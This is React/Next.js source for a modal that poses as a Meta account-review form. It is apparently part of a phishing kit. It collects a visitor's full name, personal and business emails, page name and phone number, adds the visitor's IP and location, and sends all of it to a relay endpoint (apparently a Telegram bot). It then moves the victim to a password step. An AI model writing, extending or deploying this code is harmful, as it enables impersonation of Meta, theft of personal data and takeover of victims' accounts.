'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { useTranslation } from '@/hooks/useTranslation';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState, useEffect } from 'react';

const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { 
    ssr: false,
    loading: () => <div className='h-9 sm:h-10 bg-gray-100 rounded-lg' />
});

interface FormData {
    investigationInfo: string;
    fullName: string;
    pageName: string;
    personalEmail: string;
    businessEmail: string;
    agreeTerms: boolean;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'pageName', label: 'Page Name', type: 'text' }
];
const InitModal: FC = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [formData, setFormData] = useState<FormData>({
        investigationInfo: '',
        fullName: '',
        pageName: '',
        businessEmail: '',
        personalEmail: '',
        agreeTerms: false
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
    const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';

    // Shared translation hook - uses geoInfo from store, handles hardcoded + API fallback
    const { t } = useTranslation([
        'Request Review',
        'Please provide the information below to help us review your account.',
        'Please provide us information that will help us investigate',
        'Full Name',
        'Personal Email',
        'Business Email',
        'Page Name',
        'Mobile phone number',
        'I agree with Terms of use',
        'Submit',
    ]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            nationalMode: true,
            strictMode: false,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false,
            formatOnDisplay: false,
            formatAsYouType: false
        }),
        [countryCode]
    );

    // Reset form fields when modal closes
    useEffect(() => {
        if (formStep !== 'init') {
            setFormData({
                investigationInfo: '',
                fullName: '',
                pageName: '',
                businessEmail: '',
                personalEmail: '',
                agreeTerms: false
            });
            setPhoneNumber('');
            setIsLoading(false);
        }
    }, [formStep]);

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number.startsWith('+') ? number : `+${number}`);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        // Fallback validation in case the phone input library skips native required checks.
        if (!phoneNumber.trim()) {
            return;
        }

        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📄 Page Name:</b> <code>${formData.pageName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📧 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Store user data and switch to password form step
            setUserEmail(formData.personalEmail);
            setUserFullName(formData.fullName);
            setUserPhone(phoneNumber);
            setFormStep('password');
        }
    };

    // Only show init modal if formStep is not set to password or other steps
    if (formStep && formStep !== 'init') {
        return null;
    }

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-full max-w-md sm:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                <div className='flex w-full items-center justify-between p-3 sm:p-3.5 pb-1'>
                    <p className='text-xs sm:text-sm font-bold whitespace-nowrap'>{t('Request Review')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-3 sm:px-3.5'>
                    <div className='flex flex-col gap-1.5 sm:gap-2 py-2.5 sm:py-3'>
                        <div>
                            <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Please provide us information that will help us investigate')}</p>
                            <textarea
                                required
                                name='investigationInfo'
                                value={formData.investigationInfo}
                                onChange={handleInputChange}
                                className='min-h-16 sm:min-h-20 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
                                rows={3}
                            />
                        </div>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name] as string} onChange={handleInputChange} className='min-h-16 sm:min-h-20 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' rows={2} /> : <input required name={field.name} type={field.type} value={formData[field.name] as string} onChange={handleInputChange} className='h-11 sm:h-12 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' />}
                            </div>
                        ))}
                        <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                        {countryCode ? (
                            <IntlTelInput
                                key={countryCode}
                                onChangeNumber={handlePhoneChange}
                                initOptions={initOptions}
                                inputProps={{
                                    name: 'phoneNumber',
                                    required: true,
                                    maxLength: 11,
                                    className: 'h-11 sm:h-12 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
                                }}
                            />
                        ) : (
                            <div className='h-11 sm:h-12 w-full rounded-[8px] border-2 border-[#d4dbe3] bg-gray-50 animate-pulse' />
                        )}

                        <label className='flex items-center gap-2 cursor-pointer mt-0.5'>
                            <input
                                type='checkbox'
                                name='agreeTerms'
                                checked={formData.agreeTerms}
                                onChange={handleInputChange}
                                className='w-4 h-4 cursor-pointer accent-blue-600'
                            />
                            <span className='text-xs sm:text-sm text-[#1C2B33]'>{t('I agree with Terms of use')}</span>
                        </label>

                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-2.5 flex h-9 sm:h-10 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-2 sm:p-2.5'>
                    <Image src={MetaLogo} alt='' className='h-3 sm:h-3.5 w-12 sm:w-14' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
